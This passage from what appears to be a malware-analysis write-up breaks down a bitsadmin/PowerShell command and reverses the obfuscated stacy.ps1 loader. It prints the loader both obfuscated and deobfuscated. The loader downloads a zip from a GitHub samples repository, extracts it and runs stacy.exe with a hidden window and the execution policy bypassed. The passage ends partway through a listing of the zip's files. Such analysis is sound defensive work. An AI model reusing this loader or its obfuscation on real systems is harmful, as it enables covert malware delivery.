+&lt;/div>&lt;p>As seen above, the command uses &lt;strong>bitsadmin&lt;/strong> and &lt;strong>powershell&lt;/strong> to download and execute a powershell script named &lt;strong>stacy.ps1&lt;/strong>&lt;/p>
+&lt;p>Below are the command breakdown.&lt;/p>
+&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>bitsadmin.exe /transfer:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>bitsadmin.exe&lt;/strong> is a command-line tool used to create, manage, and monitor download and upload jobs. It is often used to perform file transfers in the background.&lt;/li>
+&lt;li>&lt;strong>/transfer&lt;/strong> is a parameter used to create a new transfer job. In this context, it’s downloading a file.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>&amp;ldquo;f48920e537d9c4e0e795971da3646444190eecd24d719303becdd9a13bfa5810&amp;rdquo;:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>This is the job name or identifier for the bitsadmin transfer job. It’s a unique identifier for this particular download job.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>&lt;a class="link" href="https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1" target="_blank" rel="noopener"
+>https://raw.githubusercontent.com/Internet-2-0/file-samples/master/scripts/powershell/stacy.ps1&lt;/a>:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>This is the URL from which the file (stacy.ps1) will be downloaded. The file is a PowerShell script hosted on GitHub.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>C:\path\to\stacy.ps1:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>This specifies the local path where the file will be saved. In this case, it’s attempting to save it to the current working directory with the name stacy.ps1.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>&amp;amp;&amp;amp;:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>This is a conditional operator in batch scripts. It runs the command following &amp;amp;&amp;amp; only if the preceding command (bitsadmin.exe) succeeds.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>powershell.exe -NoP -wiNdowSTYLE hiddeN -ExEcuTioNPolicy BypAss -CoMmAND &amp;ldquo;C:\path\to\stacy.ps1&amp;rdquo;:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>This is the PowerShell command that will be executed if the file download is successful.&lt;/li>
+&lt;/ul>
+&lt;p>&lt;strong>Flags and Parameters:&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>-NoP (or -NoProfile):&lt;/strong>
+&lt;ul>
+&lt;li>Runs PowerShell without loading the profile scripts, which can speed up execution and reduce potential interference.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>-wiNdowSTYLE hiddeN:&lt;/strong>
+&lt;ul>
+&lt;li>Sets the PowerShell window to be hidden. This makes the execution less noticeable to users.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>-ExEcuTioNPolicy BypAss:&lt;/strong>
+&lt;ul>
+&lt;li>Bypasses the execution policy. By default, PowerShell restricts script execution, but this flag allows scripts to run regardless of policy settings.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>&lt;strong>-CoMmAND C:\path\to\stacy.ps1:&lt;/strong>
+&lt;ul>
+&lt;li>Specifies the command to run, which is to execute the PowerShell script located at C:\path\to\stacy.ps1.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h1 id="reversing-stacyps1">Reversing stacy.ps1
+&lt;/h1>&lt;p>Retrieve the powershell script from the url founded.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-ps1" data-lang="ps1">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">llIIllIIllIIllIIllIIllIIllIIllIIllII($vP9MZDGjnoJ&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$Mohfy6VuAN25tmCcilWJ&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$xgWjzvyhbOVsU6La79&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$vP9MZDGjnoJ&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Mohfy6VuAN25tmCcilWJ&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-split&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$Mt&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$xgWjzvyhbOVsU6La79&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">clone&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[&lt;/span>&lt;span class="no">array&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">reverse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Mt&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$MXfstqmCoh2iTbaGnwr0j4Ny&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">UTF8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetString&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">FromBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$Mt&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$MXfstqmCoh2iTbaGnwr0j4Ny&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">llIIllIIllIIllIIIIIIllIIllIlllllllII($7lGQcpZoLf6Yk2CPEezSv&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$6cZyHm8aYQX&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">-join&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">0x5a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">0x61&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">0x7a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-Random&lt;/span> &lt;span class="n">-Count&lt;/span> &lt;span class="mf">20&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">char&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$6cZyHm8aYQX$7lGQcpZoLf6Yk2CPEezSv&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$hg34RNfykz5XdxBn287mU9&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">llIIllIIllIIllIIllIIllIIllIIllIIllII&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;=\x90A\x90X\x90a\x906\x905\x90S\x90b\x90v\x901\x902\x90c\x905\x90N\x90W\x90Y\x900\x90N\x903\x90L\x90j\x90N\x90X\x90a\x90t\x909\x90i\x90c\x90l\x90R\x903\x90c\x90h\x901\x902\x90L\x903\x90F\x90m\x90c\x90v\x90M\x90X\x90Z\x90s\x90B\x90X\x90b\x90h\x90N\x90X\x90L\x90l\x90x\x90W\x90a\x90m\x909\x90C\x90M\x90t\x90I\x90T\x90L\x900\x90V\x90m\x90b\x90y\x90V\x90G\x90d\x90u\x90l\x900\x90L\x90t\x909\x902\x90Y\x90u\x90I\x90W\x90d\x90o\x90R\x90X\x90a\x90n\x909\x90y\x90L\x906\x90M\x90H\x90c\x900\x90R\x90H\x90a\x90&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$tQsoNjk&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">llIIllIIllIIllIIllIIllIIllIIllIIllII&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;l\x90h\x90X\x90Z\x90u\x90w\x90G\x90b\x90l\x90h\x902\x90c\x90y\x90V\x902\x90d\x90v\x90B\x90H\x90X\x90w\x904\x90S\x90M\x902\x90x\x90F\x90b\x90s\x90V\x90G\x90a\x90T\x90J\x90X\x90Z\x903\x909\x90G\x90U\x90z\x90d\x903\x90b\x90k\x905\x90W\x90a\x90X\x90x\x90l\x90M\x90z\x900\x90W\x90Z\x900\x90N\x90X\x90e\x90T\x90x\x901\x90c\x903\x909\x90G\x90Z\x90u\x90l\x902\x90V\x90c\x90p\x90z\x90Q&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$RXNPxpB&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">llIIllIIllIIllIIIIIIllIIllIlllllllII&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.zip&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$CcAn4K8e&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="n">llIIllIIllIIllIIIIIIllIIllIlllllllII&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="nv">$hg34RNfykz5XdxBn287mU9&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="nv">$RXNPxpB&lt;/span>&lt;span class="p">;&lt;/span>&lt;span class="nb">Expand-Archive&lt;/span> &lt;span class="nv">$RXNPxpB&lt;/span> &lt;span class="n">-DestinationPath&lt;/span> &lt;span class="nv">$CcAn4K8e&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;amp;&lt;/span> &lt;span class="nv">$tQsoNjk&lt;/span> &lt;span class="n">-exECUtIonPOLicY&lt;/span> &lt;span class="n">bYpAsS&lt;/span> &lt;span class="nb">stArT-ProcEss&lt;/span> &lt;span class="n">-FilepaTH&lt;/span> &lt;span class="s2">&amp;#34;.\&lt;/span>&lt;span class="nv">$CcAn4K8e&lt;/span>&lt;span class="s2">\stacy.exe&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Deobfuscate it to make it more readable.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-ps1" data-lang="ps1">&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Decode-Base64String($encodedString&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$paddingCharacter&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="s2">&amp;#34;\x90&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$cleanedString&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$encodedString&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">replace&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$paddingCharacter&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="n">-split&lt;/span> &lt;span class="s2">&amp;#34; &amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$reversedArray&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nv">$cleanedString&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">clone&lt;/span>&lt;span class="p">();&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="p">[&lt;/span>&lt;span class="no">array&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">reverse&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$reversedArray&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$decodedString&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="no">System.Text.Encoding&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">UTF8&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="py">GetString&lt;/span>&lt;span class="p">([&lt;/span>&lt;span class="no">System.Convert&lt;/span>&lt;span class="p">]::&lt;/span>&lt;span class="n">FromBase64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nv">$reversedArray&lt;/span>&lt;span class="p">));&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="nv">$decodedString&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kd">function&lt;/span>&lt;span class="w"> &lt;/span>&lt;span class="nb">Generate-RandomString($inputString&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nv">$randomString&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="n">-join&lt;/span> &lt;span class="p">((&lt;/span>&lt;span class="n">0x41&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">0x5a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">+&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">0x61&lt;/span>&lt;span class="p">..&lt;/span>&lt;span class="n">0x7a&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nb">Get-Random&lt;/span> &lt;span class="n">-Count&lt;/span> &lt;span class="mf">20&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="p">%&lt;/span> &lt;span class="p">{[&lt;/span>&lt;span class="no">char&lt;/span>&lt;span class="p">]&lt;/span>&lt;span class="nv">$_&lt;/span>&lt;span class="p">});&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="nv">$randomString$inputString&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$downloadUrl&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Decode-Base64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;=\x90A\x90X\x90a\x906\x905\x90S\x90b\x90v\x901\x902\x90c\x905\x90N\x90W\x90Y\x900\x90N\x903\x90L\x90j\x90N\x90X\x90a\x90t\x909\x90i\x90c\x90l\x90R\x903\x90c\x90h\x901\x902\x90L\x903\x90F\x90m\x90c\x90v\x90M\x90X\x90Z\x90s\x90B\x90X\x90b\x90h\x90N\x90X\x90L\x90l\x90x\x90W\x90a\x90m\x909\x90C\x90M\x90t\x90I\x90T\x90L\x900\x90V\x90m\x90b\x90y\x90V\x90G\x90d\x90u\x90l\x900\x90L\x90t\x909\x902\x90Y\x90u\x90I\x90W\x90d\x90o\x90R\x90X\x90a\x90n\x909\x90y\x90L\x906\x90M\x90H\x90c\x900\x90R\x90H\x90a\x90&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$executablePath&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Decode-Base64String&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;l\x90h\x90X\x90Z\x90u\x90w\x90G\x90b\x90l\x90h\x902\x90c\x90y\x90V\x902\x90d\x90v\x90B\x90H\x90X\x90w\x904\x90S\x90M\x902\x90x\x90F\x90b\x90s\x90V\x90G\x90a\x90T\x90J\x90X\x90Z\x903\x909\x90G\x90U\x90z\x90d\x903\x90b\x90k\x905\x90W\x90a\x90X\x90x\x90l\x90M\x90z\x900\x90W\x90Z\x900\x90N\x90X\x90e\x90T\x90x\x901\x90c\x903\x909\x90G\x90Z\x90u\x90l\x902\x90V\x90c\x90p\x90z\x90Q&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$zipFileName&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Generate-RandomString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;.zip&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nv">$outputFolderName&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nb">Generate-RandomString&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Invoke-WebRequest&lt;/span> &lt;span class="nv">$downloadUrl&lt;/span> &lt;span class="n">-OutFile&lt;/span> &lt;span class="nv">$zipFileName&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nb">Expand-Archive&lt;/span> &lt;span class="nv">$zipFileName&lt;/span> &lt;span class="n">-DestinationPath&lt;/span> &lt;span class="nv">$outputFolderName&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">&amp;amp;&lt;/span> &lt;span class="nv">$executablePath&lt;/span> &lt;span class="n">-ExecutionPolicy&lt;/span> &lt;span class="n">Bypass&lt;/span> &lt;span class="nb">Start-Process&lt;/span> &lt;span class="n">-FilePath&lt;/span> &lt;span class="s2">&amp;#34;.\&lt;/span>&lt;span class="nv">$outputFolderName&lt;/span>&lt;span class="s2">\stacy.exe&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>&lt;strong>Decode-Base64String()&lt;/strong> function operates as follow:&lt;/p>
+&lt;ol>
+&lt;li>replace &amp;lsquo;\x90&amp;rsquo; character with an empty space&lt;/li>
+&lt;li>split the strings&lt;/li>
+&lt;li>reverse it&lt;/li>
+&lt;li>convert from base64&lt;/li>
+&lt;/ol>
+&lt;p>Encoded string in &lt;strong>downloadUrl&lt;/strong> variable:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">=\x90A\x90X\x90a\x906\x905\x90S\x90b\x90v\x901\x902\x90c\x905\x90N\x90W\x90Y\x900\x90N\x903\x90L\x90j\x90N\x90X\x90a\x90t\x909\x90i\x90c\x90l\x90R\x903\x90c\x90h\x901\x902\x90L\x903\x90F\x90m\x90c\x90v\x90M\x90X\x90Z\x90s\x90B\x90X\x90b\x90h\x90N\x90X\x90L\x90l\x90x\x90W\x90a\x90m\x909\x90C\x90M\x90t\x90I\x90T\x90L\x900\x90V\x90m\x90b\x90y\x90V\x90G\x90d\x90u\x90l\x900\x90L\x90t\x909\x902\x90Y\x90u\x90I\x90W\x90d\x90o\x90R\x90X\x90a\x90n\x909\x90y\x90L\x906\x90M\x90H\x90c\x900\x90R\x90H\x90a\x90
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded string in &lt;strong>downloadUrl&lt;/strong> variable:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">https://github.com/Internet-2-0/file-samples/raw/master/misc/stacysmom.zip
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Encoded string in &lt;strong>executablePath&lt;/strong> variable:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">l\x90h\x90X\x90Z\x90u\x90w\x90G\x90b\x90l\x90h\x902\x90c\x90y\x90V\x902\x90d\x90v\x90B\x90H\x90X\x90w\x904\x90S\x90M\x902\x90x\x90F\x90b\x90s\x90V\x90G\x90a\x90T\x90J\x90X\x90Z\x903\x909\x90G\x90U\x90z\x90d\x903\x90b\x90k\x905\x90W\x90a\x90X\x90x\x90l\x90M\x90z\x900\x90W\x90Z\x900\x90N\x90X\x90e\x90T\x90x\x901\x90c\x903\x909\x90G\x90Z\x90u\x90l\x902\x90V\x90c\x90p\x90z\x90Q
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>Decoded string in executablePath variable:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;ul>
+&lt;li>
+&lt;p>&lt;strong>Line 19&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>The script will then download &lt;strong>stacysmom.zip&lt;/strong> and rename it based on whatever the randomly generated output from &lt;strong>Generate-RandomString()&lt;/strong> function with &lt;strong>.zip&lt;/strong> extension.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Line 20&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>It then extracts the zip file and outputed it to another folder which again generated randomly using &lt;strong>Generate-RandomString()&lt;/strong> function.&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;li>
+&lt;p>&lt;strong>Line 21&lt;/strong>&lt;/p>
+&lt;ul>
+&lt;li>Lastly, the file will be excuted with &lt;strong>bypassed execution policy&lt;/strong>&lt;/li>
+&lt;li>&lt;code>\path\to\powershell.exe -ExecutionPolicy Bypass Start-Process -FilePath &amp;quot;.\path\to\stacy.exe&amp;quot;&lt;/code>&lt;/li>
+&lt;/ul>
+&lt;/li>
+&lt;/ul>
+&lt;h1 id="analysing-stacysmomzip">Analysing stacysmom.zip
+&lt;/h1>&lt;p>Unzipping the file presents us with several files.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">├── .fi
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">│   ├── ch_1.lnk
